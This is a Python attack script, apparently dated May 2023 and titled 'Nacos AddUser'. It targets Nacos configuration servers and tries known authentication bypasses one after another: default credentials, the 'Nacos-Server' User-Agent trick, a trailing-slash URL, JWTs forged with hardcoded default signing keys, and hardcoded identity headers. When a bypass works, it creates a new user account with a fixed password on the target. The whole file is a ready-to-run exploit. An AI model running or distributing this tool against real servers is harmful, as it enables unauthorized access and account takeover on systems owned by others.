#!/usr/bin/env python3
# coding = utf-8
# Time   : 2023/5/9 10:29

import random
import string
import argparse
import urllib

import requests


def parse_args():
    parser = argparse.ArgumentParser(description='Nacos AddUser')
    parser.add_argument('-u', "--url", help='Target url, example: http://127.0.0.1:8848/')
    args = parser.parse_args()
    return args


headers = {"sec-ch-ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"",
           "Accept": "application/json, text/plain, */*",
           "Content-Type": "application/x-www-form-urlencoded", "sec-ch-ua-mobile": "?0",
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5612.138 Safari/517.26",
           "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
           "Accept-Encoding": "gzip, deflate",
           "Accept-Language": "zh-CN,zh;q=0.9"}


def success(text):
    print(f"[+] {text}")


def info(text):
    print(f"[*] {text}")


def fail(text):
    print(f"[-] {text}")


class NacosCheck:
    def __init__(self, url) -> None:
        self.baseurl = url

        self.context = "/nacos/"
        self.username = "nacos" + str("".join(random.sample(string.digits, random.randint(3, 8))))
        self.password = "n@c0s123"

    def run(self):
        self.auth_check()
        self.default_user_pass()
        self.user_agent_bypass()
        self.url_bypass()
        self.jwt_bypass()
        self.identity_bypass()

    # 默认账号密码
    def default_user_pass(self):
        info("check default user nacos/nacos...")
        url = urllib.parse.urljoin(self.baseurl, self.context, "/v1/auth/users/login")
        data = {"username": "nacos", "password": "nacos"}
        resp = requests.post(url, headers=headers, data=data, verify=False)
        if "accessToken" in resp.text:
            success("nacos/nacos exsit!")
            exit(0)

    # 默认未授权
    def auth_check(self):
        info("check auth enable...")
        url = urllib.parse.urljoin(self.baseurl, self.context, "/v1/auth/users/")
        data = {"username": self.username, "password": self.password}
        resp = requests.post(url, headers=headers, data=data, verify=False)
        self._parse_adduser_result(resp)

    # UA绕过
    def user_agent_bypass(self):
        info("check ua bypass...")
        url = urllib.parse.urljoin(self.baseurl, self.context, "/v1/auth/users")
        data = {"username": self.username, "password": self.password}
        UA = {"User-Agent": "Nacos-Server" + headers["User-Agent"]}
        new_headers = {**headers, **UA}  # 区分大小写
        resp = requests.post(url, headers=new_headers, data=data, verify=False)
        self._parse_adduser_result(resp)

    # url 末尾斜杠绕过
    def url_bypass(self):
        info("check url bypass...")
        url = urllib.parse.urljoin(self.baseurl, self.context, "/v1/auth/users/")
        data = {"username": self.username, "password": self.password}
        resp = requests.post(url, headers=headers, data=data, verify=False)
        self._parse_adduser_result(resp)

    # jwt secret key 硬编码绕过
    def jwt_bypass(self):
        info("check jwt bypass...")
        url = urllib.parse.urljoin(self.baseurl, self.context, "/v1/auth/users")
        jwts = [
            # SecretKey012345678901234567890123456789012345678901234567890123456789
            "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6IjI2MTYyMzkwMjIifQ.5aXePQdHbh9hKNoj_qqCC4x6PzbXmpy-vYQHhi0PdjVHyDJ40Ge6CVz6AWuV1UHa4H8-A-LXMOqQGSXjrsJ8HQ",

            # VGhpc0lzTXlDdXN0b21TZWNyZXRLZXkwMTIzNDU2Nzg=
            "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0._GhyhPBLXfGVgWIAGnNT7z9mPL6-SPDAKorJ8eA1E3ZjnCPVkJYHq7OWGCm9knnDloJ7_mKDmSlHtUgNXKkkKw",

            # U2VjcmV0S2V5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5
            # "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImlhdCI6MjYxNjIzOTAyMn0.uSFCyir6S9MzNTOYLwfWIm1eQo6eO3tWskYA6fgQu55GQdrFO-4IvP6oBEGblAbYotMA6ZaS9l0ySsW_2toFPQ",

            # N2xkQXA2TkZVaGdyVU9QRllONDVJOHhVYUdtQWtjOEY=
            "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImlhdCI6MjYxNjIzOTAyMn0.jHIPHGlyaC7qKAGj0G6Kgb1WmrIpHosCnP8cHC24zceHpbyD7cmYuLc9r1oj3J6oFGr3KMnuKJlvTy8dopwNvw",

            # qwe1rty2ui3opl4kjh5gf6dsazx7cvbnm
            "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Im5hY29zIiwiaWF0IjoyNjE2MjM5MDIyfQ.BEtiFKLAleuBCeakAoC6na-Lr8mfOUYUUm3nxaM0v3L5NeLk7UGZTDXCJQRguQDgU2HYE1VK9ETDIB-qjgqVnw",

        ]
        for jwt in jwts:
            info(f"testing jwt: '{jwt}'")
            data = {"username": self.username, "password": self.password, "accessToken": jwt}
            resp = requests.post(url, headers=headers, data=data, verify=False)
            self._parse_adduser_result(resp)

    # 开启授权后identity硬编码绕过
    def identity_bypass(self):
        info("check identity bypass...")
        identities = [
            {"serverIdentity": "security"},  # nacos < 2.2.1 默认
            {"test": "test"},
            {"example": "example"},
            {"authKey": "nacosSecurty"},
        ]
        url = urllib.parse.urljoin(self.baseurl, "/nacos/v1/auth/users")

        data = {"username": self.username, "password": self.password}
        for identity in identities:
            key = list(identity.keys())[0]
            value = identity.get(key)
            info(f"testing identity key value: '{key}: {value}'")
            new_headers = {**headers, **identity}
            resp = requests.post(url, headers=new_headers, data=data, verify=False)
            self._parse_adduser_result(resp)

    def _parse_adduser_result(self, resp):
        body = resp.text
        if "already exist!" in body:
            info(f"{self.username} already exist")
            exit(0)
        elif "create user ok!" in body:
            success(f"add user {self.username}/{self.password} success!")
            exit(0)


def main():
    args = parse_args()
    nacos_check = NacosCheck(args.url)
    nacos_check.run()


if __name__ == '__main__':
    main()
